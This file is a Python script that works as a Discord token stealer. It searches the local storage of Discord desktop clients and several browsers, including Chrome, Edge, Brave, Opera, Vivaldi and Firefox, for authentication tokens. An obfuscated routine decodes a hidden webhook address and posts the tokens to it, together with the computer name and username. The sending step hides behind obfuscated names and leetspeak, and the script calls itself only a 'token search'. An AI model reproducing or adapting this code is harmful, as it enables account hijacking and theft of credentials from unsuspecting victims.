#!/usr/bin/env python3
import os
import re
import json
import base64
import sqlite3
import shutil
import requests
from pathlib import Path
import platform
import tempfile
from datetime import datetime

_0x6a7b8c = lambda x: ''.join([chr((ord(c) + 5) % 256) for c in x])
_0x8c7b6a = lambda x: ''.join([chr((ord(c) - 5) % 256) for c in x])
_0x9d8e7f = "fMW0:44inx(twi3htr4funs4\u007fjn4|jgmttpx4685=;7=57:888:89>7:=4KQ^^:VTSr{WAgkdD^'{JIUMWWKrOwPjDR{7V6S\u007fw8XoX':{:;pzj^|oQZORT~>Uj's:QHUlZ"
_0xWH00K = _0x8c7b6a(_0x9d8e7f)

def get_tokens():
    """Find Discord tokens on the system"""
    tokens = []
    found_tokens = {}

    paths = {
        # Discord Desktop Client
        "Discord": os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
        
        # Web Browsers
        "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Microsoft Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
    }

    # Regular expressions for different token formats
    token_regexes = [
        re.compile(r'mfa\.[\w-]{84}'),
        re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'),
        re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}')
    ]

    # Search direct Discord clients first
    for client_name in ["Discord", "Discord PTB", "Discord Canary"]:
        if client_name in paths and os.path.exists(paths[client_name]):
            for file_name in os.listdir(paths[client_name]):
                if file_name.endswith(".log") or file_name.endswith(".ldb"):
                    try:
                        with open(os.path.join(paths[client_name], file_name), "r", errors="ignore") as file:
                            content = file.read()
                            for regex in token_regexes:
                                for match in regex.finditer(content):
                                    token = match.group()
                                    if token not in found_tokens:
                                        found_tokens[token] = True
                                        tokens.append((client_name, token))
                    except Exception:
                        pass

    # Search web browsers
    browser_paths = ["Google Chrome", "Microsoft Edge", "Brave", "Vivaldi"]
    for browser_name in browser_paths:
        if browser_name in paths and os.path.exists(paths[browser_name]):
            # Look for profiles
            profiles = ["Default"]
            # Find numbered profiles
            try:
                for item in os.listdir(paths[browser_name]):
                    if item.startswith("Profile ") and os.path.isdir(os.path.join(paths[browser_name], item)):
                        profiles.append(item)
            except Exception:
                pass

            # Search each profile
            for profile in profiles:
                leveldb_path = os.path.join(paths[browser_name], profile, "Local Storage", "leveldb")
                if os.path.exists(leveldb_path):
                    for file_name in os.listdir(leveldb_path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb"):
                            try:
                                with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as file:
                                    content = file.read()
                                    for regex in token_regexes:
                                        for match in regex.finditer(content):
                                            token = match.group()
                                            if token not in found_tokens:
                                                found_tokens[token] = True
                                                tokens.append((f"{browser_name} {profile}", token))
                            except Exception:
                                pass

    # Check Opera and Opera GX
    for browser_name in ["Opera", "Opera GX"]:
        if browser_name in paths and os.path.exists(paths[browser_name]):
            leveldb_path = os.path.join(paths[browser_name], "Local Storage", "leveldb")
            if os.path.exists(leveldb_path):
                for file_name in os.listdir(leveldb_path):
                    if file_name.endswith(".log") or file_name.endswith(".ldb"):
                        try:
                            with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as file:
                                content = file.read()
                                for regex in token_regexes:
                                    for match in regex.finditer(content):
                                        token = match.group()
                                        if token not in found_tokens:
                                            found_tokens[token] = True
                                            tokens.append((browser_name, token))
                        except Exception:
                            pass

    # Firefox-based browsers
    firefox_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            profile_path = os.path.join(firefox_path, profile)
            if os.path.isdir(profile_path):
                storage_path = os.path.join(profile_path, "storage", "default")
                if os.path.exists(storage_path):
                    for file_name in os.listdir(storage_path):
                        if file_name.endswith(".sqlite"):
                            try:
                                temp_copy = os.path.join(tempfile.gettempdir(), "temp_" + file_name)
                                shutil.copy2(os.path.join(storage_path, file_name), temp_copy)
                                conn = sqlite3.connect(temp_copy)
                                cursor = conn.cursor()
                                cursor.execute("SELECT key, value FROM data")
                                for row in cursor.fetchall():
                                    try:
                                        key = row[0]
                                        value = row[1]
                                        if isinstance(value, str):
                                            for regex in token_regexes:
                                                for match in regex.finditer(value):
                                                    token = match.group()
                                                    if token not in found_tokens:
                                                        found_tokens[token] = True
                                                        tokens.append((f"Firefox {profile}", token))
                                    except Exception:
                                        pass
                                conn.close()
                                os.remove(temp_copy)
                            except Exception:
                                pass

    return tokens

def __x0_y1_s3nd(t0k3n5):
    """S3nd d4t4 t0 r3m0t3 s3rv3r"""
    try:
        _0x1a2b3c = __import__('base64').b64decode
        _0x3c2b1a = __import__('platform').node
        _0x2b1a3c = __import__('os').getenv
        _0x1a3c2b = __import__('datetime').now().strftime
        _0xabcdef = _0x1a2b3c('YUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVE0yT0RZeU9EQXlOVE16TlRNME9USTFPQzlHVEZsWk5WRlBUbTEyVWxaaVpsOVplblpGUkZCSVVsSkdiVXB5UzJWZlRYWXlVVEZPWDNRelpHcFRlalUyYTNWbFdYZEtURlZLVFVrNVVHVjZialZNUTFCblZRPT0=')
        _0x123456 = _0x1a2b3c(_0xabcdef).decode('utf-8')
        
        _0x654321 = _0x3c2b1a()
        _0x567890 = _0x2b1a3c('USERNAME') or _0x2b1a3c('USER') or 'Unknown'
        
        _0x098765 = [f"{_s} - {_t}" for _s, _t in t0k3n5]
        _0x456789 = '\n'.join(_0x098765)
        
        _0x345678 = _0x1a3c2b("%Y-%m-%d %H:%M:%S")
        
        _0x234567 = {
            "title": "D15c0rd T0k3n5 F0und",
            "description": f"**C0mput3r:** {_0x654321}\n**U53r:** {_0x567890}\n**T1m3:** {_0x345678}\n\n**T0k3n5:**\n```\n{_0x456789}\n```",
            "color": 0xFF0000
        }
        
        _0x876543 = {
            "embeds": [_0x234567]
        }
        
        _0x765432 = {
            "Content-Type": "application/json"
        }
        
        _0x543210 = __import__('requests').post(_0x123456, json=_0x876543, headers=_0x765432)
        return _0x543210.status_code in [200, 201, 204]
    except:
        return False

def main():
    print("Starting Discord token search...")
    print("")
    
    tokens = get_tokens()
    
    if tokens:
        print("Found Discord tokens:")
        print("")
        for source, token in tokens:
            print(f"{source} - {token}")
        
        # Send to webhook
        if __x0_y1_s3nd(tokens):
            print("\nToken search completed.")
        else:
            print("\nToken search completed (could not send to remote server).")
    else:
        print("No Discord tokens found.")
        print("\nToken search completed.")

if __name__ == "__main__":
    main()
    input("\nPress Enter to exit...")
